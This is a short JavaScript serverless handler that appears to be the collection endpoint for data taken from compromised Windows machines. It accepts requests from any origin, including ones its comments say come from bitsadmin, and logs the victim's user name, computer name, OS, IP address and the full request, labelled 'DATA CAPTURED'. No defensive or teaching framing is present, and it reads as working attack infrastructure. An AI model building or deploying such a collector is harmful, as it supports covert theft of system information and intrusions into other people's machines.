module.exports = async (req, res) => {
  console.log('🔔 Request received - Method:', req.method);
  
  // Enable CORS
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS, PUT');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  
  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }
  
  // Log ALL requests - even malformed ones
  console.log('📨 Headers:', req.headers);
  console.log('📦 Query params:', req.query);
  console.log('📝 Body:', req.body);
  console.log('🌐 IP:', req.headers['x-forwarded-for'] || 'Unknown');
  
  // Handle GET requests (from bitsadmin and other tools)
  if (req.method === 'GET') {
    console.log('🎯 GET DATA CAPTURED:');
    console.log('User:', req.query.user || 'Unknown');
    console.log('Computer:', req.query.computer || 'Unknown');
    console.log('Method:', req.query.method || 'Unknown');
    console.log('Full URL:', req.url);
    
    return res.json({
      status: 'success',
      message: 'GET data received',
      timestamp: new Date().toISOString()
    });
  }
  
  // Handle POST requests
  if (req.method === 'POST') {
    try {
      console.log('🎯 POST DATA CAPTURED:');
      
      const systemData = req.body.data || req.body;
      const clientIP = req.headers['x-forwarded-for'] || 'Unknown';
      const timestamp = new Date().toISOString();
      
      console.log('⏰ Time:', timestamp);
      console.log('🌐 IP:', clientIP);
      
      if (typeof systemData === 'string') {
        console.log('📊 Raw data:', systemData);
        // Try to parse as JSON
        try {
          const parsed = JSON.parse(systemData);
          console.log('👤 User:', parsed.user || parsed.UserName || 'Unknown');
          console.log('💻 Computer:', parsed.computer || parsed.ComputerName || 'Unknown');
          console.log('🔧 Method:', parsed.method || 'Unknown');
          console.log('📡 Info:', parsed.info || 'No additional info');
        } catch(e) {
          console.log('📄 Text data:', systemData);
        }
      } else {
        console.log('👤 User:', systemData.UserName || systemData.user || 'Unknown');
        console.log('💻 Computer:', systemData.ComputerName || systemData.computer || 'Unknown');
        console.log('🖥️ OS:', systemData.OS || 'Unknown');
      }
      
      console.log('────────────────────────────');

      return res.json({
        status: 'success',
        message: 'Data received',
        timestamp: timestamp
      });
      
    } catch (error) {
      console.error('❌ Error:', error);
      return res.status(500).json({ error: 'Processing failed' });
    }
  }
  
  return res.status(405).json({ error: 'Method not allowed' });
};
